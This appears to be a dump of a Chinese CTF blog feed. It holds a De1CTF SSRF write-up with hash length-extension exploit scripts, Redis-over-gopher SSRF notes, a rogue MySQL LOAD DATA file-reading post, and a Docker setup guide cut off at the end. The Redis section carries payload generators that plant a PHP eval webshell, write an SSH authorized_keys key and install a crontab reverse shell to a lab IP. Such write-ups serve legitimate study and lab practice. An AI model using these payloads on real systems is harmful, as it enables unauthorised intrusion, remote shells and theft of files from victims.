result[&apos;data&apos;] = f.read()            if result[&apos;code&apos;] == 500:                result[&apos;data&apos;] = &quot;Action Error&quot;        else:            result[&apos;code&apos;] = 500            result[&apos;msg&apos;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&apos;/&apos;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check=param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &apos;__main__&apos;:    app.debug = False    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p><pre><code>def Exec(self):    result = {}    result[&apos;code&apos;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&apos;data&apos;] = resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&apos;code&apos;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)            result[&apos;code&apos;] = 200            result[&apos;data&apos;] = f.read()        if result[&apos;code&apos;] == 500:            result[&apos;data&apos;] = &quot;Action Error&quot;    else:        result[&apos;code&apos;] = 500        result[&apos;msg&apos;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p><pre><code>#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p><pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p><pre><code>def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p><pre><code>def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p><pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p><h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><pre><code>import urllib,hashpumpy import requests&quot;&quot;&quot;    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&quot;&quot;&quot;url = &quot;http://139.180.128.86/&quot;#get the Sign of ScangeneSign = &quot;geneSign?&quot;payload = &quot;local_file:flag.txt&quot;re = requests.get(url+geneSign+&quot;param=&quot;+payload).textprint re#hash extend attackhashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)print hashsaction = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;cookie = {    #&quot;action&quot;:urllib.quote(hashextend),    &quot;action&quot;:action,        &quot;sign&quot;:hashs}print cookiere2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)print re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p><pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ceInput Data: local_file:flag.txtscanInput Key Length: 16Input Data to Add: read636d649a50e61e75436cc1ba50d5a003local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p><blockquote><p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p><p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p><p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p><p>You could also use a length extension attack, but this way is more simple.</p><p>So our exploit is complete.</p></blockquote><p>这是他们编写的脚本：膜</p><pre><code>import requestsdef geneSign(param):    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).textrealParam = &quot;flag.txt&quot;param = realParam+&quot;read&quot;sign = geneSign(param)param = realParamaction = &quot;readscan&quot;answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).textprint(answer)</code></pre>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis与ssrf</title>
      <link href="/2019/08/16/SSRF/"/>
      <url>/2019/08/16/SSRF/</url>
      
        <content type="html"><![CDATA[<p>SSRF留坑，没整理完。我真是个小菜鸡~</p><a id="more"></a><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h3><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><h1 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h1><ul><li>添加端口 127.0.0.1:80</li><li>短网址 <a href="http://sina.lt/" title="短网址" target="_blank" rel="noopener">http://sina.lt/</a></li><li>指向任意IP的域名 <a href="xip.io">xip.io</a></li><li>进制转换，点分十进制，八进制，二进制，十六进制，不同进制组合</li></ul><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>结合<code>dict://  file://  gopher://</code></p><pre><code>http://www.baidu.com@127.0.0.1</code></pre><h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><h2 id="定时任务写shell"><a href="#定时任务写shell" class="headerlink" title="定时任务写shell"></a>定时任务写shell</h2><p>crontab 格式 <a href="https://www.jb51.net/LINUXjishu/19905.html" title="参数解释" target="_blank" rel="noopener">https://www.jb51.net/LINUXjishu/19905.html</a></p><p>反弹shell </p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</code></pre><p>利用redis写入</p><pre><code>root@kali:~# cd redis-2.8.3/root@kali:~/redis-2.8.3# cd srcroot@kali:~/redis-2.8.3/src# ./redis-cli127.0.0.1:6379&gt; * * /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2444 0&gt;&amp;1\n&quot;OK127.0.0.1:6379&gt; config set dir /var/spool/cronOK127.0.0.1:6379&gt; config set dbfilename rootOK127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt; quit</code></pre><h1 id="使用工具无脑生成payload"><a href="#使用工具无脑生成payload" class="headerlink" title="使用工具无脑生成payload"></a>使用工具无脑生成payload</h1><p>先使用<code>./sniffer -p6379</code> 监听网卡，然后在本地redis服务中使用命令，随后断开，sniffer会打印出<code>payload</code></p><p>我们只要加上<code>curl &#39;gopher://127.0.0.1:6379/_payload&#39;</code>即可</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote><p><a href="https://xz.aliyun.com/t/5844#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5844#toc-3</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis与ssrf</title>
      <link href="/2019/08/10/redis/"/>
      <url>/2019/08/10/redis/</url>
      
        <content type="html"><![CDATA[<p>wula!<br>我爱学习！🤫</p><a id="more"></a><h1 id="redis协议分析"><a href="#redis协议分析" class="headerlink" title="redis协议分析"></a>redis协议分析</h1><p>tcpdump抓包</p><pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p><pre><code>127.0.0.1:6379&gt; set name testOK127.0.0.1:6379&gt; get name&quot;test&quot;127.0.0.1:6379&gt; </code></pre><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>RESP在Redis中用作请求-响应协议的方式如下</p><pre><code>1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。2. 服务器根据命令实现回复一种RESP类型。</code></pre><p>在RESP中。某些数据的类型取决于第一个字节：</p><ol><li>对于<code>Simple Strings</code>，回复的第一个字节是+</li><li>对于<code>error</code>,回复的第一个字节是-</li><li>对于<code>Integer</code>,，回复的第一个字节是:</li><li>对于<code>Bulk Strings</code>,回复的第一个字节是$</li><li>对于<code>array</code>,回复的第一个字节是*</li><li>此外，resp能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值</li><li>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束</li></ol><p>现在来看一下我们抓的包</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg" alt="抓包协议分析1"></p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg" alt="协议分析2"></p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg" alt="协议分析3"></p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg" alt="协议分析4"></p><p>整体来看一下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="整个通信过程"></p><p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p><p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p><h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>能未授权或通过弱口令访问到redis服务器</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见SSRF攻击方式大概这几种：</p><ol><li>绝对路径写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li></ol><h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>构造redis命令</p><pre><code>flushallset 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;config set dir /var/www/htmlconfig set dbfilename shell.phpsave</code></pre><p>转换为redis RESP格式</p><pre><code>import urllibprotocol=&quot;gopher://&quot;ip=&quot;192.168.163.128&quot;port=&quot;6379&quot;shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;,     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),     &quot;config set dir {}&quot;.format(path),     &quot;config set dbfilename {}&quot;.format(filename),     &quot;save&quot;     ]if passwd:    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):    CRLF=&quot;\r\n&quot;    redis_arr = arr.split(&quot; &quot;)    cmd=&quot;&quot;    cmd+=&quot;*&quot;+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)    cmd+=CRLF    return cmdif __name__==&quot;__main__&quot;:    for x in cmd:        payload += urllib.quote(redis_format(x))    print payload</code></pre><p>生成之后用curlr然后查询shell是否写入</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg" alt="写shell"></p><p>写入成功</p><h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p><p>构造redis命令</p><pre><code>flushallset 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali&apos;config set dir /root/.ssh/config set dbfilename authorized_keyssave</code></pre><p>改第一个脚本</p><pre><code>filename=&quot;authorized_keys&quot;ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;path=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p><h3 id="利用contrab计划反弹shell"><a href="#利用contrab计划反弹shell" class="headerlink" title="利用contrab计划反弹shell"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p><p>构造redis命令</p><pre><code>flushallset 1 &apos;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&apos;config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>改第一个命令</p><pre><code>reverse_ip=&quot;192.168.163.132&quot;reverse_port=&quot;2333&quot;cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)filename=&quot;root&quot;path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote><p><a href="https://xz.aliyun.com/t/5665#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-11</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL LOAD DATA</title>
      <link href="/2019/08/07/MySQL-LOAD-DATA/"/>
      <url>/2019/08/07/MySQL-LOAD-DATA/</url>
      
        <content type="html"><![CDATA[<p>通过伪造恶意服务器造成的攻击<br>😫😄</p><a id="more"></a><h1 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h1><h2 id="启动mysql服务"><a href="#启动mysql服务" class="headerlink" title="启动mysql服务"></a>启动mysql服务</h2><pre><code>service mysql startMariaDB [mysql]&gt; create database test;MariaDB [test]&gt; create table users(    -&gt; id int auto_increment primary key,    -&gt; username varchar(30),    -&gt; password varchar(30));Query OK, 0 rows affected (0.026 sec)MariaDB [test]&gt; insert into users (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</code></pre><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><pre><code>use mysqlupdate user set password=PASSWORD(&apos;admin&apos;) where User=&apos;root&apos;;flush privileges;quitservice mysql restartmysql -h 127.0.0.1 -u root -p  #如果tcpdump抓不到包就尝试设置 -h参数指定为本地回环地址</code></pre><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><pre><code>tcpdump -i lo port 3306 -w test.cap</code></pre><p>tcpdump使用指南：<a href="https://www.cnblogs.com/pyng/p/9698723.html" title="tcpdump使用" target="_blank" rel="noopener">https://www.cnblogs.com/pyng/p/9698723.html</a></p><h1 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h1><p>load data infile 主要是读取一个文件的内容并且放到一个表中，通常有两种用法</p><pre><code>load data infile &quot;/data/data.csv&quot; into table TestTable fields terminated by &apos;分隔符;            //读取服务器文件load data local infile &quot;/home/lightless/data.csv&quot; into table TestTable fields terminated by &apos;分隔符; //读取本地文件</code></pre><p>查看官方文档<br><img src="https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>我们读取本地文件，并抓取3306端口流量分析</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdhx9h84j30jx02lt9b.jpg" alt="读取本地文件 test.txt"></p><p>文件内容是 <code>hello world!</code></p><p>抓取流量</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdhzvg9vj30k602n0u2.jpg" alt="抓取3306端口流量"></p><p>丢进wireshark</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdi51lqsj30l20kz77j.jpg" alt="客户端请求服务器"></p><p>第一个包看起来比较正常，是客户端发起的<code>Request Query</code>，如果你无法使用<code>LOAD DATA INFILE</code>语法的话，考虑在连接 <code>MySQL</code> 的时候加上<code>--enable-local-infile</code>选项，或者设置<code>local_infile</code>全局变量为<code>ON</code>。我们可以看到第一个数据包是客户端发送的请求包，包含了请求命令。</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5rdi2fq31j30kd0cgjt2.jpg" alt="服务器应答"></p><p>服务器对请求做出响应，响应内容包含了文件名。</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdi7lfm1j30kx0dyjtf.jpg" alt="客户端发出请求，发送文件内容"></p><p>客户端发送服务器返回的文件名的文件内容给服务器。</p><p>于是我们想到，如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，并附上我们指定的文件，是不是就可以读取客户端的文件了，答案是肯定的。引用大佬<a href="https://lightless.me/archives/read-mysql-client-file.html" title="大佬" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a>的文章</p><blockquote><pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！服务端：OK，读取你本地 data.csv 文件并发给我！客户端：这是文件内容：balabal！</code></pre><p>正常情况下，这个流程不会有什么问题，但是如果我们制作了恶意的客户端，并且回复服务端任意一个我们想要获取的文件，那么情况就不一样了。</p><pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！服务端：OK，读取你本地的 / etc/passwd 文件并发给我！客户端：这是文件内容：balabal（/etc/passwd 文件的内容）！</code></pre></blockquote><p>伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在LOAD DATA LOCAL的时候。</p><h1 id="伪造服务端"><a href="#伪造服务端" class="headerlink" title="伪造服务端"></a>伪造服务端</h1><p>利用github上项目： <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a><br><a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql load data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04 配置docker</title>
      <link href="/2019/08/02/ubuntu%E9%85%8D%E7%BD%AEdocker/"/>
      <url>/2019/08/02/ubuntu%E9%85%8D%E7%BD%AEdocker/</url>
      
        <content type="html"><![CDATA[<p>学会装docker，走遍天下都不怕!<br>😊 🆒</p><a id="more"></a><h1 id="Ubuntu-16-04-配置docker"><a href="#Ubuntu-16-04-配置docker" class="headerlink" title="Ubuntu 16.04 配置docker"></a>Ubuntu 16.04 配置docker</h1><p>想装个docker好好学学p神的vulhub:<a href="https://github.com/vulhub/vulhub" title="p神-vulhub">https://github.com/vulhub/vulhub</a></p><h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><p>先备份</p><pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</code></pre><p>更换</p><pre><code>sudo gedit /etc/apt/sources.list</code></pre><p>阿里</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</code></pre><p>清华</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</code></pre><p>网易</p><pre><code>deb http://mirrors.163.com/ubuntu/ wily main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-backports main restricted universe multiverse</code></pre><p>执行更新</p><pre><code>sudo apt-get update</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>查看内核版本</p><pre><code>uname -r</code></pre><p>启动服务</p><pre><code>sudo service docker start</code></pre><p>测试</p><pre><code>docker run hello-world</code></pre><h2 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h2><p>新建<code>/etc/docker/daemon.json</code>文件来配置daemon，在该文件中加入</p><pre><code>{  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]}</code></pre><h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><p>我们通过使用<code>-t -i</code>参数来进入交互式终端</p><pre><code>docker run -i -t ubuntu:15.10 /bin/bash</code></pre><p>我们已进入终端，可以使用<code>ls</code>，<code>cat /proc/version</code>查看信息.</p><p>我们使用 -d 参数创建一个以进程方式运行的容器</p><p>docker -d </p><p>我们使用 ps 来查看容器信息</p><pre><code>docker ps</code></pre><p>我们使用 stop 来停止容器</p><pre><code>docker stop name</code></pre><p>我们使用<code>docker images</code> 来列出本地镜像列表</p><p>使用 <code>docker pull</code> 来获得一个镜像</p><p>使用 <code>docker search name</code> 来查找一个镜像</p><h3 id="运行一个web应用"><a href="#运行一个web应用" class="headerlink" title="运行一个web应用"></a>运行一个web应用</h3><p>在docker中运行一个Python flask 应用来运行一个web应用。</p><pre><code>docker pull training/webapp #载入镜像docker run -d -P training/webapp python app.py</code></pre><p>-P将容器内部使用的网络端口随机映射到我们使用的主机高端口上<br>-p容器内部端口绑定到指定主机端口</p><p>另外 我们也可以指定IP地址。</p><h2 id="下载vulhub"><a href="#下载vulhub" class="headerlink" title="下载vulhub"></a>下载vulhub</h2><pre><code>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip 